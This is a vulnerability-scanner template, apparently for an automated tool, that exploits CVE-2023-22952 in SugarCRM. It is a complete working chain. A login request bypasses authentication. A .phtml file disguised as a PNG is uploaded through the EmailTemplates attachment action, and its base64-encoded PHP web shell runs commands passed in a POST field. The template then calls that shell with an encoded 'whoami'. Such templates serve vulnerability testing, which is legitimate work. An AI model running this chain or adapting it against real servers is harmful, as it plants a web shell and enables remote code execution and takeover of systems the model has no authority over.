id: CVE-2023-22952

info:
  name: SugarCRM EmailTemplates RCE
  author: zhizhuo
  severity: critical
  verified: true
  description: |
    In SugarCRM before 12.0. Hotfix 91155, a crafted request can inject custom PHP code through the EmailTemplates because of missing input validation.
    
  reference:
    - https://attackerkb.com/topics/E486ui94II/cve-2023-22952

set:
  randstr: randomLowercase(6)
  rboundary: randomLowercase(8)
  payload: base64Decode("iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTsgZWNobyAiIyMjIyMiOyA/PiD2GHg3AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAKklEQVQokWNgwA0YmZhZWNnYOTi5uHl4+fgFBIWERUTFxCXwaBkFQxQAADC+AS1MHloSAAAAAElFTkSuQmCC")
rules:
  r0:
    request:
      method: POST
      path: /index.php
      headers:
        Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
      body: module=Users&action=Authenticate&user_name=brenda&user_password=DbLiL98a
    expression: response.status == 500 && response.body.ibcontains(b'You must specify a valid username and password')
  r1:
    request:
      method: POST
      path: /index.php
      headers:
        Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
      body: |-
        --WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="module"
        
        EmailTemplates
        --WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="action"
        
        AttachFiles
        --WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{randstr}}.phtml"
        Content-Type: image/png
        
        {{payload}}
        --WebKitFormBoundary{{rboundary}}--
        
    expression: response.status == 200 && response.body.bcontains(bytes(randstr+'.phtml'))
  r2:
    request:
      method: POST
      path: /cache/images/{{randstr}}.phtml
      headers:
        Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
      body: c=d2hvYW1p
    expression: response.status == 200 && response.body.bcontains(b'##')
    # expression: 'response.status == 200 && "#####(.*)#####".bmatches(response.body)'
expression: r0() && r1() && r2()
